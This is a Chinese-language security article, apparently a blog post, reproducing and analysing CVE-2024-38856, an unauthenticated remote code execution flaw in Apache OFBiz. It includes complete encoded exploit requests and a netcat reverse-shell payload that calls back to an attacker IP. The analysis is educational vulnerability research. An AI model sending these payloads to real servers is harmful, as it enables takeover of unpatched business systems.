#  CVE-2024-38856：Apache OFBiz远程代码执行漏洞   
 宁云志科技   2024-08-23 16:08  
  
>   
> 关注我们❤️，添加星标🌟，一起学安全！作者：hexixi@Timeline Sec 本文字数：3813阅读时长：2～4mins声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
Apache OFBiz  
是一个开源 ERP 系统，可帮助企业自动化和集成会计、人力资源、客户关系管理、订单管理、制造和电子商务等各种流程。使用Java语言开发，基于Java企业版（Java EE）的技术栈，包括Java Servlet、JavaServer Pages（JSP）、Java数据库连接（JDBC）等。  
## 0x02 漏洞概述  
  
**漏洞编号：CVE-2024-38856**  
  
ControlServlet和RequestHandler函数，在处理请求中存在授权错误，导致未经身份验证的远程攻击者通过构造特殊URL来覆盖最终的渲染视图，从而执行任意代码。  
## 0x03 影响版本  
  
Apache OFBiz  <=  18.12.14  
## 0x04 环境搭建  
  
https://github.com/apache/ofbiz-framework/releases/tag/release18.12.14  
  
在官网中下载ofbiz，idea打开，构建  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtN9GXYrVBE3oKOBrAViaiadGoI3r6BlblmBZcHf4PgkqZAaiaR0wYFIhjg/640?wx_fmt=png&from=appmsg "")  
  
在ofbiz-framework-release18.12.14\framework\security\config\security.properties里添加私有IP地址（方便攻击）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYt5huKZF4zPncicpSD0e4wOxENeaI1E6ibtyuiaf36nE2Zylicwz6txWjFFw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtVkHTvibxmRcFxSe3Fsib4c9p3DBddoIIqRyUFkyIJroucwCkVpIhwOaA/640?wx_fmt=png&from=appmsg "")  
  
运行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtXC458k6iby63AYu0ibicppOJImiaLRG1h8x0u0LbZyNgS0HWwrliaicV3wfw/640?wx_fmt=png&from=appmsg "")  
  
访问https://192.168.56.1:8443/webtools/control/main/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYt2RtYFqZTXlJRs0HwV5jnTx6qibXt6Lpr48c86ZQ7MbXLCTWvstMGib1g/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
```
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: 192.168.56.1:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 272

groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0063\u0061\u006c\u0063\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b
```  
  
POST发送的数据编码前  
为：  
  
groovyProgram=throw new Exception('calc'.execute().text);  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtew0aIar7NAaia2rGzVib6ib7eCdQBMOKibqgnO2ofBxWZM530RQRJF6Lkg/640?wx_fmt=png&from=appmsg "")  
  
**反弹shell操作**攻击机打开nc端口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtzgIia6m816hsDvnmSg4wIqdpN6Vrkb4iaAswrvH1jrCppqAqXz1VW1Bg/640?wx_fmt=png&from=appmsg "")  
  
payload：  
  
throw new Exception('nc 192.168.244.133 4444 -e cmd.exe'.execute().text);   
  
将payload进行unicode编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtNNXEjU5KL13MnK76AnucIiabLd5UIT0K9iaK4LDPO7nPAxjTgmibG0bnA/640?wx_fmt=png&from=appmsg "")  
```
POST /webtools/control/main/ProgramExport HTTP/1.1
Host: 192.168.56.1:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 458

groovyProgram=\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u006e\u0063\u0020\u0031\u0039\u0032\u002e\u0031\u0036\u0038\u002e\u0032\u0034\u0034\u002e\u0031\u0033\u0033\u0020\u0034\u0034\u0034\u0034\u0020\u002d\u0065\u0020\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b\u0020

```  
  
成功反弹到shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtiaYabEaJbJqI279boH2vIDzLrnF531npcXFeIOxZCXQ6aCkAJTPf1iaQ/640?wx_fmt=png&from=appmsg "")  
## 0x06 漏洞分析  
  
org.apache.ofbiz.webapp.control.ControlServlet类会处理所有以/control/开头的URL请求。在其类中doPost和doGet方法对环境进行相应的初始化，并调用RequestHandler的doRequest()方法处理请求。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYteEicWpmUExtecnIMjQwadFk8xae0vkibK14FJm3jR9m3HXbBascGlZUg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYteEicWpmUExtecnIMjQwadFk8xae0vkibK14FJm3jR9m3HXbBascGlZUg/640?wx_fmt=png&from=appmsg "")  
  
requestUri获取了路由配置，再往下看请求  "main" 对应的请求映射集合，并作出处理请求的安全认证。overrideViewUri用于实现视图渲染，查看view类型操作。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtAVKSw0Er4SubxaLMTjvUT8zm3HFRMlRXa21au1BHuXjq0M12ZujD1w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtpgcZCQlPfey1INH5HY73W3mqB0sWRQ5n33dCgHRib2ttVTmqicFnmRmw/640?wx_fmt=png&from=appmsg "")  
```
if ("view".equals(nextRequestResponse.type)) {
  if (Debug.verboseOn()) Debug.logVerbose("[RequestHandler.doRequest]: Response is a view." + showSessionId(request), module);
                // check for an override view, only used if "success" = eventReturn
       String viewName = (UtilValidate.isNotEmpty(overrideViewUri) && (eventReturn == null || "success".equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;
       renderView(viewName, requestMap.securityExternalView, request, response, saveName);
       } 

```  
  
viewName的值会有三种情况：  
- 如果 overrideViewUri 不为空，并且 eventReturn 为空或者等于 "success"，则 viewName 的值为 overrideViewUri。  
  
- 如果 overrideViewUri 为空，并且 eventReturn 不为空且不等于 "success"，则 viewName 的值为 nextRequestResponse.value。  
  
- 如果两个条件都不满足，即 overrideViewUri 为空且 eventReturn 为空或者不等于 "success"，则 viewName 的值为 nextRequestResponse.value。  
  
为了达到漏洞利用，首先需要需要requestUri所认定的不鉴权且路由为view类型，调用viewName的值为overrideViewUri，也就是达成条件overrideViewUri存在，而且事件返回为success。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtEBr0ZJROrXAXXPO7Q5vme1ZNU5jZ6shnzGKHba03ibPEpU68xpt02XQ/640?wx_fmt=png&from=appmsg "")  
  
查看webapp/webtools/WEB-INF/controller.xml mian符合上述所说情况  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtLunOlOW3Rj2EV6IP9cs3UyFOPgLNjkK8MH3aR6o2H79V8wFjSuY5vg/640?wx_fmt=png&from=appmsg "")  
  
其次就是找到如何进行rce的利用了，在widget/EntityScreens.xml中的ProgramExport，尝试解析执行/webtools/groovyScripts/entity/ProgramExport.groovy，并且groovyProgram可控。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVshYK4XBBDWZ23z90L11DRYtIQialxX46ia7T81sjdic7kGNZqmoeQgFX1K8t4kZwLAaBKB9laEjMtarA/640?wx_fmt=png&from=appmsg "")  
  
因此整个漏洞的思路就是，在requestUri选择一个可以绕过验证的路由，返回类型为success，为此达到renderView实现带有可利用路由的overrideViewUri。  
## 修复方式  
  
将Apache OFBiz更新至最新版本。  
## 参考链接  
  
https://forum.butian.net/article/524https://www.secrss.com/articles/68838https://cn-sec.com/archives/3037801.html  
## 历史文章  
  
[CVE-2023-51467](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247493478&idx=1&sn=2a232c707b97c00dd318d997ffb55c12&chksm=903ac196a74d4880464618fcaaf52cc51c4b60ceec0088112e52fc9216b27f869221660cd500&scene=21#wechat_redirect)  
  
  
[CVE-2021-26295](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247488170&idx=1&sn=f01215d61a465885b59f0d23696f6cd8&chksm=9039345aa74ebd4c73fda938955d9135e9dd6d68b9ff8982ab454d64e26b33ff3926a8e28726&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群回复  
【SRC群】进入SRC-QQ交流群回复  
【新人】领取新人学习指南资料回复  
【面试】获取渗透测试常见面试题回复  
【合作】获取各类安全项目合作方式回复  
【帮会】付费加入SRC知识库学习回复  
【  
培训】  
获取TimelineSec官方培训课程详情  
  
  
视频号：搜索  
TimelineSec  
  
官方微博：[#小程序://微博/tPbUYdN9EucSD4C]()  
  
  
哔哩哔哩：  
https://space.bilibili.com/52459  
‍1903  
  
  
  
❤  
  
觉得有用就点赞转发！  
  
想看什么欢迎评论区留言～  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
